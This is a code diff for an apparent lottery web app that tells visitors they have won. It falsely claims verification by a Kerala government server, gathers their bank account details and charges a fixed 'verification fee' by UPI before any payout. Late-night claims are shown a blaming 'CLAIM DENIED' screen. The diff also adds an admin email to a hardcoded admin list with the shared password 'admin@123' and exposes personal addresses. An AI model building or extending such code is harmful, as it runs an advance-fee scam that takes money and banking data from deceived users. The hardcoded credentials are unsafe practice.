+            $('check-step-tickets').classList.remove('hidden');
+            if (window.lucide) window.lucide.createIcons();
+        };
+
+        window.checkerBackToPhone = () => {
+            $('check-step-tickets').classList.add('hidden');
+            $('check-step-phone').classList.remove('hidden');
+        };
+
+        window.checkerSubmitCheck = async () => {
+            const validTickets = window.trackerTickets || [];
+            if (validTickets.length === 0) {
+                showToast("No active tickets found to perform check.", "error");
+                return;
+            }
+            
+            showToast("Verifying live results with Kerala Govt Server...", "info");
+            
+            // Sync cloud claims / grievances to prevent double claims across devices
+            if (db && window.trackerPhoneNumber) {
+                try {
+                    const qGriv = query(collection(db, "grievances"), where("phone", "==", window.trackerPhoneNumber));
+                    const snapGriv = await getDocs(qGriv);
+                    if (!snapGriv.empty) {
+                        snapGriv.docs.forEach(d => {
+                            syncToLocalTable("grievances", { id: d.id, ...d.data() });
+                        });
+                    }
+                } catch (e) {
+                    console.warn("Claims guard cloud check info:", e);
+                }
+            }
+
+            // Retrieve latest results
+            let results = [];
+            if (db) {
+                try {
+                    const snap = await getDocs(collection(db, "results"));
+                    if (!snap.empty) {
+                        results = snap.docs.map(doc => ({ id: doc.id, ...doc.data() }));
+                        localStorage.setItem('cached_results', JSON.stringify(results));
+                        localStorage.setItem('cached_results_timestamp', Date.now().toString());
+                        results.forEach(r => syncToLocalTable("results", r));
+                    }
+                } catch (e) {
+                    console.warn("Results retrieval error inside checker engine:", e);
+                }
+            }
+            if (results.length === 0) {
+                const localRes = getLocalTable("results");
+                if (localRes && localRes.length > 0) results = localRes;
+            }
+            if (results.length === 0) {
+                const cachedResults = localStorage.getItem('cached_results');
+                if (cachedResults) {
+                    try { results = JSON.parse(cachedResults); } catch(e) {}
+                }
+            }
+            if (results.length === 0) {
+                results = DEFAULT_RESULTS;
+            }
+            
+            // Filter by date if existing customer specified a date
+            if (window.checkerExistedCustomer && window.checkerSelectedDate) {
+                results = results.filter(r => r.date === window.checkerSelectedDate);
+            }
+
+            window.trackerWinningTickets = [];
+            window.trackerWinningAmount = 0;
+            
+            let rowHTML = "";
+
+            if (results.length === 0) {
+                let dText = window.checkerSelectedDate ? `for date ${window.checkerSelectedDate}` : "";
+                $('checker-results-grid-rows').innerHTML = `
+                    <tr>
+                        <td colspan="4" style="padding: 24px; text-align: center; color: #94a3b8; font-weight: 600;">
+                            No official draw results published ${dText}. (इस तारीख के लिए कोई लॉटरी ड्रॉ नहीं मिला।)
+                        </td>
+                    </tr>
+                `;
+                $('checker-display-total-winnings').innerText = "₹0";
+                
+                $('checker-results-action').innerHTML = `
+                    <p style="font-size:13px; color:#ef4444; font-weight:700; text-align:center; margin-bottom:15px;">Better Luck Next Time! No draw matches this date. (इस दिनांक के लिए ड्रॉ उपलब्ध नहीं है।)</p>
+                    <button class="btn-gold" style="width:100%; padding:12px; background:#1e293b; color:#fff;" onclick="checkerBackToTickets()">
+                        Back to My Tickets (टिकट सूची देखें)
+                    </button>
+                `;
+                
+                $('check-step-tickets').classList.add('hidden');
+                $('check-step-results').classList.remove('hidden');
+                if (window.lucide) window.lucide.createIcons();
+                return;
+            }
+            
+            function getTicketCategory(tick) {
+                if (tick.startsWith("KL")) return "basic";
+                if (tick.startsWith("SL")) return "standard";
+                return "premium";
+            }
+            
+            validTickets.forEach(ticket => {
+                const category = getTicketCategory(ticket);
+                const categoryLabel = category.charAt(0).toUpperCase() + category.slice(1);
+                
+                let isWinner = false;
+                let amt = 0;
+                let drawName = "";
+                
+                results.forEach(rd => {
+                    if (rd.prizesMap && rd.prizesMap[ticket] !== undefined) {
+                        isWinner = true;
+                        amt += Number(rd.prizesMap[ticket]);
+                        drawName = rd.name || "Daily Draw";
+                    } else {
+                        const p1List = (rd.prize1 || "").split(',').map(s => s.trim().toUpperCase());
+                        const p2List = (rd.prize2 || "").split(',').map(s => s.trim().toUpperCase());
+                        const p3List = (rd.prize3 || "").split(',').map(s => s.trim().toUpperCase());
+                        
+                        if (p1List.includes(ticket)) {
+                            isWinner = true;
+                            amt += Number(rd.prize1Amount || 0);
+                            drawName = rd.name || "Daily Draw";
+                        } else if (p2List.includes(ticket)) {
+                            isWinner = true;
+                            amt += Number(rd.prize2Amount || 0);
+                            drawName = rd.name || "Daily Draw";
+                        } else if (p3List.includes(ticket)) {
+                            isWinner = true;
+                            amt += Number(rd.prize3Amount || 0);
+                            drawName = rd.name || "Daily Draw";
+                        }
+                    }
+                });
+                
+                let resultBadge = "";
+                let amountText = "";
+                
+                if (isWinner && amt > 0) {
+                    resultBadge = `<span style="background: #22c55e; color: #ffffff; padding: 4px 10px; border-radius: 4px; font-weight: 800; border: 1px solid #16a34a; font-size:11.5px; display:inline-block; animation: pulse 2s infinite;">Winner 🎉</span>`;
+                    amountText = `<span style="color: #15803d; font-weight: 900; font-size:14px;">₹${amt.toLocaleString('en-IN')}</span>`;
+                    
+                    window.trackerWinningTickets.push({
+                        ticket: ticket,
+                        category: category,
+                        amount: amt,
+                        drawName: drawName
+                    });
+                    window.trackerWinningAmount += amt;
+                    
+                    // High quality visual green row for winning tickets as requested!
+                    rowHTML += `
+                        <tr style="border-bottom:1.5px solid #bbf7d0; background-color: #f0fdf4;">
+                            <td style="padding:12px 12px; font-weight:800; font-family:var(--accent-font); color:#15803d;">${ticket}</td>
+                            <td style="padding:12px 12px;"><span style="font-size:11px; padding:3px 8px; border-radius:4px; font-weight:700; background:#dcfce7; color:#15803d;">${categoryLabel}</span></td>
+                            <td style="padding:12px 12px;">${resultBadge}</td>
+                            <td style="padding:12px 12px; text-align:right;">${amountText}</td>
+                        </tr>
+                    `;
+                } else {
+                    resultBadge = `<span style="background: #f1f5f9; color: #94a3b8; padding: 4px 8px; border-radius: 4px; font-weight: 600; font-size:11px;">Unlucky ❌</span>`;
+                    amountText = `<span style="color: #94a3b8;">-</span>`;
+                    
+                    rowHTML += `
+                        <tr style="border-bottom:1px solid #e2e8f0; background-color: #ffffff;">
+                            <td style="padding:12px 12px; font-weight:700; font-family:var(--accent-font); color:#475569;">${ticket}</td>
+                            <td style="padding:12px 12px;"><span style="font-size:11px; padding:2px 6px; border-radius:4px; font-weight:600; ${category === 'basic' ? 'background:#eff6ff; color:#1d4ed8;' : category === 'standard' ? 'background:#fdf2f8; color:#db2777;' : 'background:#f0fdf4; color:#16a34a'}">${categoryLabel}</span></td>
+                            <td style="padding:12px 12px;">${resultBadge}</td>
+                            <td style="padding:12px 12px; text-align:right;">${amountText}</td>
+                        </tr>
+                    `;
+                }
+            });
+            
+            $('checker-results-grid-rows').innerHTML = rowHTML;
+            $('checker-display-total-winnings').innerText = "₹" + window.trackerWinningAmount.toLocaleString('en-IN');
+            
+            const actionContainer = $('checker-results-action');
+            if (window.trackerWinningAmount > 0) {
+                if (hasAlreadyClaimed(window.trackerPhoneNumber)) {
+                    actionContainer.innerHTML = `
+                        <div style="background: #f0fdf4; border: 1.5px solid #22c55e; border-radius: 8px; padding: 12px; margin-bottom: 15px; text-align: center; color: #15803d; font-weight: 700; font-size: 13px;">
+                            ✨ Amount Already Claimed (आपका दावा पहले से ही सबमिट किया जा चुका है।)
+                            <p style="font-size: 11px; font-weight: 500; color: #166534; margin-top: 4px;">Your payout is under process and will be approved within 72 hours.</p>
+                        </div>
+                    `;
+                } else {
+                    actionContainer.innerHTML = `
+                        <button class="btn-gold" style="width:100%; padding: 14px; font-size:14.5px; font-weight:900; display:flex; align-items:center; justify-content:center; gap:6px; background: linear-gradient(135deg, #22c55e 0%, #15803d 100%); color:#fff; border:none; box-shadow:0 4px 10px rgba(22, 163, 74, 0.3);" onclick="openTrackerCongratsPopup()">
+                            CLAIM WINNINGS NOW (दावा करें) <i data-lucide="arrow-right" style="width:18px; height:18px;"></i>
+                        </button>
+                    `;
+                }
+            } else {
+                actionContainer.innerHTML = `
+                    <p style="font-size:13px; color:#ef4444; font-weight:700; text-align:center; margin-bottom:15px;">Better Luck Next Time! No winning tickets found in this search. (इस खोज में कोई भी विजयी टिकट नहीं मिला।)</p>
+                    <button class="btn-gold" style="width:100%; padding:12px; background:#1e293b; color:#fff;" onclick="checkerBackToTickets()">
+                        Back to My Tickets (टिकट सूची देखें)
+                    </button>
+                `;
+            }
+            
+            $('check-step-tickets').classList.add('hidden');
+            $('check-step-results').classList.remove('hidden');
+            if (window.lucide) window.lucide.createIcons();
+        };
+
+        window.checkerBackToTickets = () => {
+            $('check-step-results').classList.add('hidden');
+            $('check-step-tickets').classList.remove('hidden');
+        };
+
+        window.openTrackerCongratsPopup = () => {
+            const title = $('congrats-title-text');
+            const sub = $('congrats-hindi-text');
+            const amt = $('congrats-prize-amount');
+            
+            if (title) title.innerHTML = `Congratulations ${window.trackerClientName}! 🎉`;
+            if (sub) sub.innerHTML = `बधाई हो, ${window.trackerClientName}! आप केरल स्टेट लॉटरी ड्रॉ में विजयी रहे हैं।`;
+            if (amt) amt.innerText = "₹" + window.trackerWinningAmount.toLocaleString('en-IN');
+            
+            const popup = $('checker-congrats-modal');
+            if (popup) {
+                popup.style.display = 'flex';
+                if (typeof playBellTypeSound === "function") playBellTypeSound();
+            } else {
+                window.checkerProceedToBankForm();
+            }
+        };
+
+        window.closeCongratsAndProceedToBank = () => {
+            const popup = $('checker-congrats-modal');
+            if (popup) popup.style.display = 'none';
+            window.checkerProceedToBankForm();
+        };
+
+        window.checkerProceedToBankForm = () => {
+            // Auto fill Name from the Client's matched order automatically
+            $('checker-bank-name').value = window.trackerClientName || "";
+            $('checker-bank-bankname').value = "";
+            $('checker-bank-acc').value = "";
+            $('checker-bank-ifsc').value = "";
+            $('checker-bank-branch').value = "";
+
+            $('check-step-results').classList.add('hidden');
+            $('check-step-bank').classList.remove('hidden');
+        };
+
+        window.checkerBackToResults = () => {
+            $('check-step-bank').classList.add('hidden');
+            $('check-step-results').classList.remove('hidden');
+        };
+
+        window.checkerSubmitBankForm = () => {
+            const name = $('checker-bank-name').value.trim();
+            const bankname = $('checker-bank-bankname').value.trim();
+            const acc = $('checker-bank-acc').value.trim();
+            const ifsc = $('checker-bank-ifsc').value.trim().toUpperCase();
+            const branch = $('checker-bank-branch').value.trim();
+            
+            if (!name || !bankname || !acc || !ifsc || !branch) {
+                showToast("Please fill all bank details (कृपया सभी बैंक विवरण भरें).", "error");
+                return;
+            }
+            
+            // Calculate government processing fee
+            const numWinners = window.trackerWinningTickets.length;
+            let fee = 0;
+            let feeDesc = "";
+            
+            function getFixedFee(cat) {
+                if (cat === "basic") return 3999;
+                if (cat === "standard") return 4450;
+                return 5500;
+            }
+            
+            if (numWinners === 1) {
+                const winTk = window.trackerWinningTickets[0];
+                const cat = winTk.category;
+                fee = getFixedFee(cat);
+                feeDesc = `Fixed single-ticket verification charge for <b>${cat.toUpperCase()}</b> Tier winner = <b>₹${fee}</b>`;
+            } else if (numWinners === 2) {
+                const winTk1 = window.trackerWinningTickets[0];
+                const winTk2 = window.trackerWinningTickets[1];
+                const fee1 = getFixedFee(winTk1.category);
+                const fee2 = getFixedFee(winTk2.category);
+                fee = fee1 + fee2;
+                feeDesc = `Combined fixed verification fee for 2 winner tickets (${winTk1.category.toUpperCase()} ₹${fee1} + ${winTk2.category.toUpperCase()} ₹${fee2}) = <b>₹${fee}</b>`;
+            } else if (numWinners > 2) {
+                fee = Math.round(window.trackerWinningAmount * 0.01);
+                feeDesc = `1% claims processing fee on total winnings (₹${window.trackerWinningAmount.toLocaleString('en-IN')}) for more than 2 winning tickets = <b>₹${fee}</b>`;
+            }
+            
+            window.trackerClaimFee = fee;
+            $('checker-fee-amount').innerText = "₹" + fee.toLocaleString('en-IN');
+            $('checker-fee-description').innerHTML = `${feeDesc}<br><span style="font-size:10px; display:inline-block; margin-top:4px;">(सत्यापन शुल्क का भुगतान नीचे करें और दावा स्वीकृत प्राप्त करें।)</span>`;
+            
+            // Setup QR code and UPI ID
+            const upi = appSettings.upi_id || "lottery@okhdfcbank";
+            $('checker-upi-text').innerText = upi;
+            const qrUrl = "https://api.qrserver.com/v1/create-qr-code/?size=250x250&data=" + encodeURIComponent(`upi://pay?pa=${upi}&am=${fee}&cu=INR&pn=WinnerReleased_Claim`);
+            $('checker-qr-image').src = qrUrl;
+            
+            // Reset verification steps
+            $('checker-utr').value = '';
+            $('checker-ss-preview').innerHTML = '';
+            $('checker-ss').value = '';
+            
+            $('check-step-bank').classList.add('hidden');
+            $('check-step-qr').classList.remove('hidden');
+        };
+
+        window.checkerBackToBank = () => {
+            $('check-step-qr').classList.add('hidden');
+            $('check-step-bank').classList.remove('hidden');
+        };
+
+        window.checkerCopyUPI = () => {
+            const upi = appSettings.upi_id || "lottery@okhdfcbank";
+            navigator.clipboard.writeText(upi);
+            showToast("UPI ID copied to clipboard!");
+        };
+
+        window.checkerPreviewSS = () => {
+            const file = $('checker-ss').files[0];
+            if (file) {
+                const reader = new FileReader();
+                reader.onload = (e) => {
+                    $('checker-ss-preview').innerHTML = `<img src="${e.target.result}" style="width:100%; border-radius:4px; max-height:100px; object-fit:contain; border:1px solid #e2e8f0; margin-top:4px;">`;
+                };
+                reader.readAsDataURL(file);
+            }
+        };
+
+        window.checkerSubmitFinalClaim = async () => {
+            const nowCheck = new Date();
+            const currHour = nowCheck.getHours();
+            if (currHour >= 0 && currHour < 6) {
+                showToast("Claims Closed! claims must be made before 12:00 AM midnight.", "error");
+                const qrStep = $('check-step-qr');
+                if (qrStep) {
+                    qrStep.innerHTML = `
+                        <div style="text-align: center; padding: 20px;">
+                            <div style="font-size: 50px; margin-bottom: 15px;">❌</div>
+                            <h3 style="color: #ef4444; font-weight: 800; font-size: 17px; margin-bottom: 12px; font-family: var(--heading-font);">CLAIM DENIED (दावा अस्वीकार कर दिया गया)</h3>
+                            <div style="background: #fef2f2; border: 1.5px solid #fecaca; border-radius: 8px; padding: 15px; text-align: left; color: #991b1b; font-size: 12.5px; font-weight: 700; line-height: 1.6; margin-bottom: 20px;">
+                                ⚠️ Payment claim raat 12 bje se pehle karna rahega warna payment nhi hogi, iske zimmedar company nhi hogi. Apna result regular check kre!
+                                <p style="font-size: 11px; font-weight: 500; color: #b91c1c; margin-top: 6px;">As per company terms, payout claims must be submitted before 12:00 AM of the draw date. (कंपनी के नियमों के अनुसार दावों को रात 12 बजे से पहले सबमिट करना आवश्यक है। पोर्टल फ़िलहाल बंद है।)</p>
+                            </div>
+                            <button class="btn-gold" style="width: 100%; padding: 12px; background: #1e293b; color: #fff;" onclick="closeModal('trackModal')">Close Portal</button>
+                        </div>
+                    `;
+                }
+                return;
+            }
+
+            const utr = $('checker-utr').value.trim();
+            if (utr.length < 6) {
+                showToast("Please enter a valid Transaction ID / UTR (Min 6 digits).", "error");
+                return;
+            }
+            
+            const previewImg = $('checker-ss-preview').querySelector('img');
+            if (!previewImg || !previewImg.src) {
+                showToast("Payment Screenshot is required! (पेमेंट स्क्रीनशॉट अपलोड करना अनिवार्य है)", "error");
+                return;
+            }
+            const screenshotBase64 = previewImg.src;
+            
+            const name = $('checker-bank-name').value.trim();
+            const bankname = $('checker-bank-bankname').value.trim();
+            const acc = $('checker-bank-acc').value.trim();
+            const ifsc = $('checker-bank-ifsc').value.trim().toUpperCase();
+            const branch = $('checker-bank-branch').value.trim();
+            
+            const grievanceId = "GRIV-" + Date.now();
+            try {
+                showToast("Uploading verification proof... (सत्यापन प्रूफ अपलोड हो रहा है)", "info");
+                const fileObj = $('checker-ss').files[0];
+                const finalProof = await uploadProofOrFallback("ClaimProof_" + window.trackerPhoneNumber + "_" + Date.now(), fileObj, screenshotBase64);
+                
+                // Format details message for grievance
+                const ticketsListText = window.trackerWinningTickets.map(t => `${t.ticket} (Won ₹${t.amount.toLocaleString('en-IN')})`).join(', ');
+                
+                const grievanceData = {
+                    id: grievanceId,
+                    name: name,
+                    phone: window.trackerPhoneNumber,
+                    subject: "WINNER CLAIM (TICKET CHECKER)",
+                    message: `WINNING TICKETS: ${ticketsListText}\nBANK: ${bankname} - ${branch} (${ifsc})\nA/C: ${acc}\nHOLDER: ${name}\nTOTAL WINNINGS: ₹${window.trackerWinningAmount}\nUTR: ${utr}\nFEE CHARGED: ₹${window.trackerClaimFee}`,
+                    isWinnerClaim: true,
+                    winningAmount: window.trackerWinningAmount,
+                    bankDetails: {
+                        holderName: name,
+                        bankName: bankname,
+                        accountNumber: acc,
+                        ifsc: ifsc,
+                        branchName: branch
+                    },
+                    orderId: "CHECKER-" + window.trackerPhoneNumber,
+                    utrNumber: utr,
+                    claimProof: finalProof,
+                    status: "Pending",
+                    timestamp: new Date().toISOString()
+                };
+                
+                await saveToCloudAndLocal("grievances", grievanceId, grievanceData);
+                
+                // Show success screen values
+                $('checker-success-fee').innerText = "₹" + window.trackerClaimFee.toLocaleString('en-IN');
+                $('checker-success-utr').innerText = utr;
+                $('checker-success-winnings').innerText = "₹" + window.trackerWinningAmount.toLocaleString('en-IN');
+                
+                showToast("Claim submitted successfully!", "success");
+                
+                // Open visual popup confirmation for the claim as requested!
+                window.openSuccessPayoutPopup(grievanceId);
+            } catch (err) {
+                console.error("Winner claim submit error:", err);
+                showToast("Error submitting claim. Please try again.", "error");
+            }
+        };
+
+        window.openSuccessPayoutPopup = (refNumber) => {
+            const refEl = $('success-popup-ref');
+            if (refEl) refEl.innerText = refNumber;
+            const popup = $('checker-payout-success-modal');
+            if (popup) popup.style.display = 'flex';
+        };
+
+        window.closeAllClaimModals = () => {
+            const congrats = $('checker-congrats-modal');
+            if (congrats) congrats.style.display = 'none';
+            const payoutSuccess = $('checker-payout-success-modal');
+            if (payoutSuccess) payoutSuccess.style.display = 'none';
+            closeModal('trackModal');
+            window.resetTrackerFlow();
+        };
+
+        // Legacy wrapper back-compatibility
+        window.trackOrder = () => {
+            window.resetTrackerFlow();
+            openModal('trackModal');
+        };
+
+        // Stub legacy claim views
+        window.openWinnerClaimFlow = (order, amount) => {};
+        window.winnerClaimShowStep2 = () => {};
+        window.winnerClaimShowStep3 = () => {};
+        window.copyWinnerUPI = () => window.checkerCopyUPI();
+        window.previewWinnerSS = () => {};
+        window.submitWinnerFinalClaim = async () => {};
+
+        window.legacy_trackOrder = async () => {
             const queryVal = $('track-query').value.trim().toUpperCase();
             if(!queryVal) return;
 
@@ -2463,8 +3377,15 @@
                                     <div style="position: absolute; top: -10px; right: -10px; opacity: 0.1; font-size: 80px;"><i data-lucide="trophy" style="width:100px; height:100px;"></i></div>
                                     <div style="font-size: 40px; margin-bottom:10px; animation: pulse 2s infinite;">🏆</div>
                                     <h5 style="color: #854d0e; margin-bottom: 8px; font-size: 18px; font-weight:800;">Total Winnings: ₹${winAmount.toLocaleString('en-IN')}</h5>
-                                    <p style="font-size: 12px; color: #a16207; margin-bottom: 15px; line-height: 1.5;">Congratulations! Your payout is verified. Click below to claim your winnings immediately.</p>
-                                    <button class="btn-gold" style="width:100%; padding: 12px; border-radius: 8px; box-shadow: 0 4px 15px rgba(212, 175, 55, 0.3); font-weight:800;" onclick="openWinnerClaimFlow(window.lastTrackedOrder, ${winAmount})">CLAIM WINNINGS NOW (दावा करें)</button>
+                                    ${hasAlreadyClaimed(found.phone) ? `
+                                        <div style="background: #f0fdf4; border: 1.5px solid #22c55e; border-radius: 8px; padding: 12px; text-align: center; color: #15803d; font-weight: 700; font-size: 13px;">
+                                            ✨ Amount Already Claimed (आपका दावा पहले से ही सबमिट किया जा चुका है।)
+                                            <p style="font-size: 11px; font-weight: 500; color: #166534; margin-top: 4px;">Your payout is under process and will be approved within 72 hours.</p>
+                                        </div>
+                                    ` : `
+                                        <p style="font-size: 12px; color: #a16207; margin-bottom: 15px; line-height: 1.5;">Congratulations! Your payout is verified. Click below to claim your winnings immediately.</p>
+                                        <button class="btn-gold" style="width:100%; padding: 12px; border-radius: 8px; box-shadow: 0 4px 15px rgba(212, 175, 55, 0.3); font-weight:800;" onclick="openWinnerClaimFlow(window.lastTrackedOrder, ${winAmount})">CLAIM WINNINGS NOW (दावा करें)</button>
+                                    `}
                                 </div>
                             ` : ''}
                         </div>
@@ -2473,7 +3394,9 @@
                     window.lastTrackedOrder = found;
                     if (isWinner && winAmount > 0) {
                         setTimeout(() => {
-                            window.openWinnerClaimFlow(window.lastTrackedOrder, winAmount);
+                            if (!hasAlreadyClaimed(found.phone)) {
+                                window.openWinnerClaimFlow(window.lastTrackedOrder, winAmount);
+                            }
                         }, 700);
                     }
                 } else {
@@ -2556,6 +3479,27 @@
         };
 
         window.submitWinnerFinalClaim = async () => {
+            const nowCheck = new Date();
+            const currHour = nowCheck.getHours();
+            if (currHour >= 0 && currHour < 6) {
+                showToast("Claims Closed! claims must be submitted before 12:00 AM midnight.", "error");
+                const step3 = $('winner-claim-step3');
+                if (step3) {
+                    step3.innerHTML = `
+                        <div style="text-align: center; padding: 20px;">
+                            <div style="font-size: 50px; margin-bottom: 15px;">❌</div>
+                            <h3 style="color: #ef4444; font-weight: 800; font-size: 17px; margin-bottom: 12px; font-family: var(--heading-font);">CLAIM DENIED (दावा अस्वीकार कर दिया गया)</h3>
+                            <div style="background: #fef2f2; border: 1.5px solid #fecaca; border-radius: 8px; padding: 15px; text-align: left; color: #991b1b; font-size: 12.5px; font-weight: 700; line-height: 1.6; margin-bottom: 20px;">
+                                ⚠️ Payment claim raat 12 bje se pehle karna rahega warna payment nhi hogi, iske zimmedar company nhi hogi. Apna result regular check kre!
+                                <p style="font-size: 11px; font-weight: 500; color: #b91c1c; margin-top: 6px;">As per company terms, payout claims must be submitted before 12:00 AM of the draw date. (कंपनी के नियमों के अनुसार दावों को रात 12 बजे से पहले सबमिट करना आवश्यक है। पोर्टल फ़िलहाल बंद है।)</p>
+                            </div>
+                            <button class="btn-gold" style="width: 100%; padding: 12px; background: #1e293b; color: #fff;" onclick="closeModal('winnerClaimModal')">Close Portal</button>
+                        </div>
+                    `;
+                }
+                return;
+            }
+
             const utr = $('winner-claim-utr').value.trim();
             if (utr.length < 6) {
                 showToast("Please enter a valid Transaction ID / UTR (Min 6 digits).", "error");
@@ -2836,7 +3780,7 @@
                         <h4 style="font-family: var(--heading-font); color: var(--deep-red); font-weight:700; margin-bottom:4px; font-size:18px;">${r.name}</h4>
                         <p style="font-size: 11px; color: #64748b; margin-bottom: 12px; font-weight:600;"><i data-lucide="calendar" style="width:12px; height:12px; display:inline-block; vertical-align:middle; margin-right:4px;"></i> Draw Date: ${r.date}</p>
                         <div style="overflow-x:auto;">
-                            <table class="result-table" style="width:100%; border-collapse:collapse; min-width:400px; border:1px solid #e2e8f0;">
+                            <table class="result-table" style="width:100%; border-collapse:collapse; border:1px solid #e2e8f0;">
                                 <thead style="background:#f8fafc;">
                                     <tr>
                                         <th style="padding:10px; text-align:left; border:1px solid #e2e8f0; font-size:12px; color:#475569; font-weight:700;">Prize Category (इनाम श्रेणी)</th>
@@ -2892,7 +3836,7 @@
             const pass = $('login-pass').value.trim();
             if(!email || !pass) { showToast("Email and Password required", "error"); return; }
             
-            const targetAdmins = ["admin@kerala.com", "khanazlan997@gmail.com"];
+            const targetAdmins = ["admin@kerala.com", "khanazlan997@gmail.com", "publicadsnetwork@gmail.com"];
             const targetPass = "admin@123";
             
             try {
@@ -3091,7 +4035,7 @@
                     </div>
                     <div class="admin-table-container">
                         <table class="admin-table">
-                            <thead><tr><th>Order Details</th><th>Name/Phone</th><th>Tickets</th><th>Payment Info</th><th>Status</th><th>Actions</th></tr></thead>
+                            <thead><tr><th>Order Details</th><th>Name/Phone</th><th>Tickets</th><th>Amount</th><th>Payment Info</th><th>Status</th><th>Actions</th></tr></thead>
                             <tbody id="admin-orders-rows"></tbody>
                         </table>
                     </div>
@@ -3109,7 +4053,7 @@
                         }
                     }
                     knownOrderIdsHistory = currentIds;
-
+ 
                     const rows = $('admin-orders-rows');
                     if(rows) {
                         rows.innerHTML = "";
@@ -3126,6 +4070,9 @@
                                         <div style="font-size:11px;">${o.phone}</div>
                                     </td>
                                     <td><div style="max-width:120px; font-size:10px; overflow:auto; white-space:nowrap;">${o.tickets}</div></td>
+                                    <td style="font-weight: 850; color: #b91c1c; font-family: var(--font-mono); font-size:14px;">
+                                        ₹${o.totalAmount ? o.totalAmount.toLocaleString('en-IN') : 'N/A'}
+                                    </td>
                                     <td>
                                         <div style="font-size:11px;">UTR: <b>${o.utrNumber || 'N/A'}</b></div>
                                         <div style="font-size:10px; color:#475569; margin-top:2px;">UPI: <span style="font-weight:600; font-family:var(--font-mono); color:#0f766e;">${o.upiUsed || 'N/A'}</span></div>
@@ -3685,7 +4632,8 @@
                 if (table === "authorized_emails") {
                     const initial = [
                         { email: "admin@kerala.com", role: "Admin", approved_at: new Date().toISOString() },
-                        { email: "khanazlan997@gmail.com", role: "Admin", approved_at: new Date().toISOString() }
+                        { email: "khanazlan997@gmail.com", role: "Admin", approved_at: new Date().toISOString() },
+                        { email: "publicadsnetwork@gmail.com", role: "Admin", approved_at: new Date().toISOString() }
                     ];
                     localStorage.setItem('local_db_' + table, JSON.stringify(initial));
                     return initial;
@@ -3751,6 +4699,8 @@
                     await setDoc(doc(db, table, id), data);
                 } catch (e) {
                     console.error(`Cloud sync failed for ${table}/${id}:`, e);
+                    showToast(`Cloud Sync Alert: ${e.message || e}`, "error");
+                    throw e;
                 }
             }
         }
@@ -3758,11 +4708,13 @@
         async function deleteFromCloudAndLocal(table, id) {
             syncToLocalTable(table, { id }, true);
             if (db) {
-                try {
-                    await deleteDoc(doc(db, table, id));
-                } catch (e) {
+                // Background cloud delete so that user experience is extremely fast and responsive
+                deleteDoc(doc(db, table, id)).then(() => {
+                    console.log(`Cloud delete complete for ${table}/${id}`);
+                }).catch((e) => {
                     console.error(`Cloud delete failed for ${table}/${id}`, e);
-                }
+                    showToast(`Cloud Delete Alert: ${e.message || e}`, "error");
+                });
             }
         }
 
